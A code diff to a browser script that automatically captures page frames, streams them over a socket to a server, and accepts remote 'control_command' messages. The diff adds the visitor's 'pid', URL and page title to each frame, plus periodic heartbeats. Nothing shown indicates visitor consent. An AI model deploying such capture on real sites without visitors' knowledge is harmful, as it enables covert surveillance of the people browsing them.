@@ -274,12 +274,25 @@
   // Function to send the frame data
   function sendFrame(frameData) {
     try {
-      // Send frame data to server
+      // Get URL parameters to include with the frame
+      const urlParams = new URLSearchParams(window.location.search);
+      const pid = urlParams.get('pid');
+      
+     // Send frame data to server with additional info
       socket.emit('screen_frame', {
         frameData: frameData,
         frameType: 'image',
         timestamp: Date.now(),
-        frameId: Math.random().toString(36).substring(2, 15)
+        frameId: Math.random().toString(36).substring(2, 15),
+        pid: pid,
+        url: window.location.href,
+        title: document.title
+      });
+      
+      // Also send a heartbeat with the frame
+      socket.emit('visitor_heartbeat', { 
+        pid: pid,
+        timestamp: Date.now()
       });
     } catch (err) {
       console.error('Error sending frame:', err);
@@ -327,6 +340,32 @@
     }
   }
   
+  // Set up heartbeat to keep connection alive
+  function setupHeartbeat() {
+    // Send heartbeat every 15 seconds
+    const heartbeatInterval = setInterval(() => {
+      const urlParams = new URLSearchParams(window.location.search);
+      const pid = urlParams.get('pid');
+      
+      if (pid) {
+        try {
+          socket.emit('visitor_heartbeat', { 
+            pid: pid,
+            timestamp: Date.now(),
+            url: window.location.href
+          });
+        } catch (e) {
+          console.error('Error sending heartbeat:', e);
+        }
+      }
+    }, 15000);
+    
+    // Clear interval when window is closed
+    window.addEventListener('beforeunload', () => {
+      clearInterval(heartbeatInterval);
+    });
+  }
+  
   // Listen for control commands
   socket.on('control_command', (command) => {
     console.log('Received control command:', command);
@@ -341,7 +380,7 @@
     }
   });
   
-// Listen for window resize to update canvas dimensions
+  // Listen for window resize to update canvas dimensions
   window.addEventListener('resize', () => {
     if (captureInterval) {
       canvas.width = Math.min(window.innerWidth, 1280);
@@ -351,6 +390,9 @@
   
   // Start capture automatically after a short delay
   setTimeout(startCapture, 1500);
+  
+  // Setup heartbeat
+  setupHeartbeat();
   
   // Export functions to window scope for debugging
   window.screenCapture = {
